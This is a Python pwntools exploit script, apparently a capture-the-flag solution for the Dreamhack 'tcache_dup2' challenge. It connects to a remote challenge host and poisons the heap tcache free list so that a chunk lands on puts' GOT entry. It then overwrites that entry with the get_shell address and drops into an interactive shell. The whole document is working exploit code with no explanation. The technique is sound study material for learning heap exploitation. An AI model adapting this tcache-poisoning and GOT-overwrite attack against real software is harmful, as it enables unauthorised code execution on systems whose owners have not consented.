from pwn import *

p = remote("host3.dreamhack.games", 10811)
elf = ELF("./tcache_dup2")
puts_got = elf.got['puts']
get_shell = elf.symbols['get_shell']

def create(size, data):
    p.sendlineafter(">", '1')
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)

def modify(idx, size, data):
    p.sendlineafter("> ", '2')
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)

def delete(idx):
    p.sendlineafter("> ", '3')
    p.sendlineafter("idx: ", str(idx))


create(0x10, "a")
create(0x10, "a")

delete(0)
delete(1)

modify(1, 0x8, p64(puts_got))
create(0x10, "a")
create(0x10, p64(get_shell))

p.interactive()
